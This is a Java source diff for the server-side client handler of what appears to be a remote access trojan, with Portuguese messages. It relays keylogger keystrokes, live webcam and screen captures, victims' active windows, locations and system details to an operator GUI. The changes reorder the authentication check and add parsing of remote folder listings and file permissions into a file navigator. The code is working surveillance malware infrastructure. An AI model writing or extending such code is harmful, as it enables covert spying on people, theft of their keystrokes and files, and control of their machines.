@@ -5,6 +5,8 @@ package br.com.introcdc.connect.server.connection;
 
 import br.com.introcdc.connect.Connect;
 import br.com.introcdc.connect.server.ConnectServer;
+import br.com.introcdc.connect.server.components.ServerFileComponents;
+import br.com.introcdc.connect.server.components.settings.FileInfo;
 import br.com.introcdc.connect.server.gui.ServerGUI;
 import br.com.introcdc.connect.server.components.ServerAudioComponents;
 import br.com.introcdc.connect.server.components.ServerControlComponents;
@@ -23,6 +25,7 @@ import java.net.Socket;
 import java.util.ArrayList;
 import java.util.List;
 import java.util.concurrent.TimeUnit;
+import java.util.regex.Matcher;
 
 public class ClientHandler implements Runnable {
 
@@ -52,6 +55,10 @@ public class ClientHandler implements Runnable {
     private int screens = 0;
     private int webcams = 0;
     private long ping = 0;
+    private boolean creatingList = false;
+    private List<FileInfo> fileList = new ArrayList<>();
+    private boolean creatingInfo = false;
+    private StringBuilder infoBuilder = null;
 
     private BufferedImage screenImage;
     private BufferedImage webcamImage;
@@ -129,40 +136,22 @@ public class ClientHandler implements Runnable {
                     auth = true;
                     ServerGUI.addClientToTable(getClientKey(), null, null, getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                     ServerAudioComponents.generateBeep(100, 1500, true);
-                } else if (!auth) {
-                    closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + this.location + ")");
-                    ServerAudioComponents.generateBeep(100, 250, true);
-                    return;
                 } else if (command.startsWith("date:")) {
                     installDate = command.replace("date:", "");
                 } else if (command.startsWith("os:")) {
                     os = command.replace("os:", "");
-                } else if (command.equalsIgnoreCase("ping")) {
-                    ConnectServer.msg(getClientInfo() + ": " + (System.currentTimeMillis() - pingTest) + "ms");
-                } else if (command.startsWith("chat-msg:")) {
-                    String message = command.substring(9);
-                    if (!message.isEmpty()) {
-                        showChat(getClientInfo() + ": " + message);
-                    }
-                } else if (command.startsWith("chat-log:")) {
-                    String message = command.substring(9);
-                    if (!message.isEmpty()) {
-                        showChat(message);
-                    }
                 } else if (command.equalsIgnoreCase("rping")) {
                     pingTest = System.currentTimeMillis();
                     send("r-ping");
-                } else if (command.equalsIgnoreCase("r-ping")) {
-                    ping = System.currentTimeMillis() - pingTest;
-                    ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
                 } else if (command.startsWith("updateinfo ")) {
                     String[] args = command.split(" ", 4);
                     screens = Integer.parseInt(args[1]);
                     webcams = Integer.parseInt(args[2]);
-                    activeWindow = args[3];
+                    activeWindow = args[3].isEmpty() ? "Área de Trabalho" : args[3];
+                    if (getClientName().equalsIgnoreCase("Desconhecido")) {
+                        continue;
+                    }
                     ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
-                } else if (command.startsWith("keylogger ")) {
-                    ConnectServer.msg(getClientInfo() + ": Tecla: " + command.substring(10));
                 } else if (command.equalsIgnoreCase("icon-screen") || command.equalsIgnoreCase("icon-webcam")) {
                     boolean webcam = command.equalsIgnoreCase("icon-webcam");
                     ConnectServer.EXECUTOR.schedule(() -> new Thread(() -> {
@@ -193,6 +182,27 @@ public class ClientHandler implements Runnable {
                             ConnectServer.msg(getClientInfo() + ": Ocorreu um erro ao abrir o servidor de icone");
                         }
                     }).start(), 1, TimeUnit.SECONDS);
+                } else if (!auth) {
+                    closeConnection("Conexão com o cliente " + getClientIP() + " não identificada! (" + command + " / " + this.location + ")");
+                    ServerAudioComponents.generateBeep(100, 250, true);
+                    return;
+                } else if (command.equalsIgnoreCase("ping")) {
+                    ConnectServer.msg(getClientInfo() + ": " + (System.currentTimeMillis() - pingTest) + "ms");
+                } else if (command.startsWith("chat-msg:")) {
+                    String message = command.substring(9);
+                    if (!message.isEmpty()) {
+                        showChat(getClientInfo() + ": " + message);
+                    }
+                } else if (command.startsWith("chat-log:")) {
+                    String message = command.substring(9);
+                    if (!message.isEmpty()) {
+                        showChat(message);
+                    }
+                } else if (command.equalsIgnoreCase("r-ping")) {
+                    ping = System.currentTimeMillis() - pingTest;
+                    ServerGUI.updateClientTable(getClientKey(), screenImage, webcamImage, "#" + getClientId() + " " + getClientName(), getClientIP(), installDate, location, os, webcams, screens, ping, activeWindow);
+                } else if (command.startsWith("keylogger ")) {
+                    ConnectServer.msg(getClientInfo() + ": Tecla: " + command.substring(10));
                 } else if (command.equalsIgnoreCase("screen-image") || command.equalsIgnoreCase("screen-live") ||
                         command.equalsIgnoreCase("webcam-image") || command.equalsIgnoreCase("webcam-live")
                         || command.equalsIgnoreCase("view-image")) {
@@ -551,6 +561,35 @@ public class ClientHandler implements Runnable {
                     ConnectServer.msg(getClientInfo() + ": " + command);
                     if (command.contains("Interfaces USB:") || command.contains("Separador de Linha:")) {
                         ConnectServer.msg(getClientInfo() + ": IP: " + getClientIP() + " (" + this.location + ")");
+                    } else if (command.startsWith("> Pasta ")) {
+                        if (creatingList) {
+                            creatingList = false;
+                            ServerFileComponents.createFileNavigator(fileList, command);
+                            fileList.clear();
+                        } else {
+                            creatingList = true;
+                            fileList.clear();
+                        }
+                    } else if (command.startsWith("INFO: ")) {
+                        creatingInfo = true;
+                        infoBuilder = new StringBuilder(command);
+                    } else {
+                        if (creatingList) {
+                            Matcher matcher = ServerFileComponents.LINE_PATTERN.matcher(command);
+                            if (matcher.find()) {
+                                boolean isDirectory = !matcher.group("slash").isEmpty();
+                                int index = Integer.parseInt(matcher.group("index"));
+                                String name = matcher.group("name").trim();
+                                String info = matcher.group("info").trim();
+                                fileList.add(new FileInfo(isDirectory, info, name, index));
+                            }
+                        } else if (creatingInfo && infoBuilder != null) {
+                            infoBuilder.append("\n").append(command);
+                            if (command.contains("Permissoes: R: ")) {
+                                creatingInfo = false;
+                                new Thread(() -> JOptionPane.showMessageDialog(ServerFileComponents.FRAME, infoBuilder.toString())).start();
+                            }
+                        }
                     }
                 }
             }
